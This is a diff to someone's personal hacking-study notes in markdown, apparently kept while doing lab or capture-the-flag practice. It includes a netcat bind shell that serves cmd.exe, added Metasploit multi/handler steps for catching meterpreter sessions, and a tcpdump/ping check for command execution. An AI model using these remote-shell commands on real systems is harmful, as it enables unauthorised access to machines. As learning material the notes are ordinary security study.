@@ -117,6 +117,16 @@ Random notes I've made while learning about hacking that might prove useful in t
 - target pc: `nc -lvnp <port> -e "cmd.exe"`
 - own pc: `nc MACHINE_IP <port>`
 
+### Generate meterpreter shell with Metasploit
+- `msfconsole -q`
+- `use multi/handler`
+- `set PAYLOAD <payload>`
+- `set LHOST <listen-address>`
+- `set LPORT <listen-port>`
+- run exploit in background: `exploit -j`
+- check which session the shell is: `sessions`
+- foreground session: `sessions <session-number>`
+
 ## Test command execution
 - start tcpdump listener for ICMP: `sudo tcpdump ip proto \\icmp -i tun0`
 - run command on target: `ping [local tun0 ip] -c 1`
